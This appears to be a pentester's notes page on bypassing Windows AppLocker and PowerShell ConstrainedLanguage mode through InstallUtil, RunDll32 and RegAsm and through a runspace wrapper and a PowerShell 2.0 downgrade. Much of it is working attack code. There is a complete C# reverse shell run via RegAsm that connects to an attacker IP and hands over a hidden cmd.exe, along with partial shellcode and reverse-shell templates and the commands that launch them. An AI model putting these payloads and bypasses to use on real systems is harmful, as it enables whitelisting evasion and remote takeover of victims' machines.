Application whitelisting restricts a system to running only approved executables, scripts, and installers, blocking anything not explicitly permitted.
# AppLocker
AppLocker is a Windows security feature that allows restricting what apps and files a user can run. EXEs, Scripts, Installer files, DLLs, etc are all potential targets.
## Enumerating AppLocker
```powershell
# Enumerate effective policy
Get-AppLockerPolicy -Effective -Xml

# Testing if we can run a file without actually running it
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Tools\SysinternalsSuite\procexp.exe -User <USER>
```
## Exploiting Default Rulesets
If the default ruleset for executable files OR scripts is set, we can simply enumerate folders in `%WINDIR%` which standard users can write to and execute from.

AppLockerBypassChecker.ps1
```powershell
Get-ChildItem $env:windir -Directory -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
    $dir = $_;
    (Get-Acl $dir.FullName).Access | ForEach-Object {
        if ($_.AccessControlType -eq "Allow") {
            if ($_.IdentityReference.Value -eq "NT AUTHORITY\Authenticated Users" -or $_.IdentityReference.Value -eq "BUILTIN\Users") {
                if (($_.FileSystemRights -like "*Write*" -or $_.FileSystemRights -like "*Create*") -and $_.FileSystemRights -like "*Execute*") {
                    Write-Host ($dir.FullName + ": " + $_.IdentityReference.Value + " (" + $_.FileSystemRights + ")");
                }
            }
        }
    };
}
```
# LOLBAS: InstallUtil
Living off the land binaries ([LOLBAS project](https://lolbas-project.github.io)) may be used to carry out attacks.

[InstallUtil](https://learn.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool) is a `Microsoft` command-line utility which can be used to install and uninstall server resources. Usually installed alongside Visual Studio. Located here:
- 32-bit: `C:\Windows\Microsoft.NET\Framework\v4.0.30319`
- 64-bit: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319`

```powershell
# Testing if we are have access
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
```
## Executing Code
Setup
1. Visual Studio > New Project > Console App (.NET Framework) > NAME
2. Project > Add Reference... > Browse > `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Configuration.Install\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Configuration.Install.dll` > Checkmark it > Ok

Template
```csharp
using System;
using System.Configuration.Install;

public class NotMalware_IU
{
    public static void Main(string[] args)
    {
    }
}

[System.ComponentModel.RunInstaller(true)]
public class A : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        // CODE EXECUTION
    }
}
```

Example Reverse shell (`micr0_shell`) - See [[AV Evasion Basics]]
```csharp
using System;
using System.Configuration.Install;

public class NotMalware_IU
{
    public static void Main(string[] args)
    {
    }
}

[System.ComponentModel.RunInstaller(true)]
public class A : System.Configuration.Install.Installer
{
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        // Shellcode (micr0_shell)
        string bufEnc = "<SNIP>";

        // Decrypt shellcode (And the rest of it. See Reference shellcode injector in AV Evasion Basics)
        <SNIP>
    }
}
```

Before compiling, change to x64 architecture (micr0_shell is x64), build.

Executing Code
```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Tools\NotMalware_IU\NotMalware_IU\bin\x64\Release\NotMalware_IU.exe
```
# LOLBAS: RunDll32
[RunDll32](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32) is a standard `Microsoft` binary which comes with `Windows`. The utility may be used to load and execute dynamic-link libraries (DLLs).
- 32-bit: `C:\Windows\SysWOW64\rundll32.exe`
- 64-bit: `C:\Windows\System32\rundll32.exe`

```powershell
# Testing if we have access
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\System32\rundll32.exe
```
## Executing Code
Be default, you cannot export DLL methods to `.NET` programs since it is managed code (executed directly by OS) instead of unmanaged (executed by[ .NET Common Language Runtime (CLR)](https://learn.microsoft.com/en-us/dotnet/standard/clr)). We can workaround this by using [DllExport](https://github.com/3F/DllExport).

>**NOTE:** This is a CLASS LIBRARY, not a full program. (its a DLL dummy)

Setup
1. Visual Studio > New Project > Class Library (.NET Framework) > NAME
2. Project > Manage NuGet Packages... > Settings (gear) > Select Package Source (Folder where you have DllExport) > OK 
3. Browse > Select `DllExport` > Install > Apply
4. Pop-up should appear. Check `Installed` > Apply
5. Visual Studio will ask to reload projects. Reload All.

Template
```csharp
namespace RShell_D
{
    internal class Program
    {
        [DllExport("DllMain")]  // Name is arbitrary
        public static void DllMain()
        {
            // CODE EXECUTION
        }
    }
}
```

Example reverse shell (RShell) - See [[AV Evasion Basics]]
```csharp
namespace RShell_D
{
    internal class Program
    {
        private static StreamWriter streamWriter; // Needs to be global so that HandleDataReceived() can access it
        
        [DllExport("DllMain")]  // Name is arbitrary
        public static void DllMain()
        {
            try
			{
			    // Connect to <IP> on <Port>/TCP
			    TcpClient client = new TcpClient();
			    client.Connect("10.10.10.10", 1010); // CHANGE
			    <SNIP>
			    p.StartInfo.FileName = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"; // 32 bit version
			    <SNIP> // SEE DYNAMIC SECTION OF AV BASICS
			}    
        }
    }
}
```

If we use 32-bit powershell absolute path, use Any CPU, then build. If using x64 bit path to powershell, change to x64, then build.

Executing Code
```powershell
C:\Windows\System32\RunDll32.exe C:\Tools\RShell_D\RShell_D\bin\Release\x86\RShell_D.dll,DllMain
```
# LOLBAS: RegAsm
RegAsm.exe is a Microsoft-signed .NET tool (its real job is registering COM stuff). Trick: if you point it at a specially crafted .NET DLL, it'll run your code inside that trusted, signed process, which helps sneak past app-whitelisting.

> **NOTE**: I grabbed this from [here](github.com/davidzzo23). 

Create this as a Class Library (.NET Framework)

POC
```csharp
using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace RegAsmGhost
{
    [ComVisible(true)]
    public class Payload
    {
        // This method will be called by RegAsm /U
        [ComUnregisterFunction]
        public static void UnregisterFunction(Type t)
        {
            try
            {
                // 1. Connect to attacker (reverse shell endpoint)
                TcpClient client = new TcpClient("10.10.15.163", 8080);
                NetworkStream stream = client.GetStream();
                StreamReader reader = new StreamReader(stream);
                StreamWriter writer = new StreamWriter(stream);

                // 2. Launch hidden CMD process
                Process proc = new Process();
                proc.StartInfo.FileName = Environment.GetEnvironmentVariable("ComSpec"); // path to cmd.exe
                proc.StartInfo.CreateNoWindow = true;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardInput = true;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.RedirectStandardError = true;
                // When CMD produces output, send it over the socket
                proc.OutputDataReceived += (sender, args) =>
                {
                    if (!string.IsNullOrEmpty(args.Data))
                    {
                        writer.WriteLine(args.Data);
                        writer.Flush();
                    }
                };
                proc.Start();
                proc.BeginOutputReadLine();  // begin asynchronous read of stdout

                // 3. Read commands from attacker and feed into CMD
                string command;
                while ((command = reader.ReadLine()) != null)
                {
                    proc.StandardInput.WriteLine(command);
                }

                // If the loop exits, either the connection or process ended.
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine("RegAsmGhost exception: " + ex.Message);
            }
        }
    }
}
```

Execution
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U <YOUR FILE>
```
# PowerShell ConstrainedLanguage Mode
In PowerShell, there are four different language modes:
    `FullLanguage`: The default language mode, no restrictions.
    `RestrictedLanguage`: Users may run commands, but may not use script blocks.
    `ConstrainedLanguage`: Operations which could be abused by a malicious actor are restricted.
    `NoLanguage`: Completely disables the PowerShell scripting language

Applocker installed? - PowerShell gets auto-set to `ConstrainedLanguage` for all users. High integrity level sessions are set to `FullLanguage`.

`ConstrainedLanguage` mode restrictions:
	Add-Type may not load arbitrary C# or Win32 APIs
	Only types from a relatively short whitelist may be used

Querying language mode
```powershell
# Query current session language mode
$ExecutionContext.SessionState.LanguageMode
```
## Bypassing ConstrainedLanguage Mode with Runspaces
Basically, we can create a runspace that we configure that does not operate in `ConstrainedLanguage` mode.

Setup
1. Visual Studio > New Project > Console App (.NET Framework) > NAME
2. Project > Add Reference... > Browse > `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll` > Checkmark it > Ok

Building
```csharp
using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
// using System.Text;

public class CLMBypass
{
    public static void Main(string[] args)
    {
        if (args.Length == 0) return;
		
		// If you want to accept base64 encoded args
		// string script = Encoding.UTF8.GetString(Convert.FromBase64String(String.Join(" ", args)));
		
        Runspace runspace = RunspaceFactory.CreateRunspace();
        runspace.Open();
        PowerShell ps = PowerShell.Create();
        ps.Runspace = runspace;
        ps.AddScript(String.Join(" ", args)); // for base64, swap out String.Join(" ", args) with script var above
        Collection<PSObject> results = ps.Invoke();

        foreach (PSObject obj in results)
        {
            Console.WriteLine(obj.ToString());
        }

        runspace.Close();
    }
}
```

Configure to use 64-bit OR leave as 32-bit, then build.

Executing
```powershell
# Current Status
$ExecutionContext.SessionState.LanguageMode
	# ConstrainedLanguage

# Move CLMBypass to C:\Windows\Tasks (because AppLocker is active)
copy c:\path\to\CLMBypass.exe C:\Windows\Tasks\CLMBypass.exe

# Usage
.\CLMBypass.exe 'echo $ExecutionContext.SessionState.LanguageMode'
	# FullLanguage
```
## Bypassing ConstrainedLanguage Mode by Downgrading to PowerShell 2.0
If installed, downgrading PowerShell to 2.0 can be used to bypass both AMSI and `ConstrainedLanguage` mode.

```powershell
# Force downgrade
powershell -version 2
```

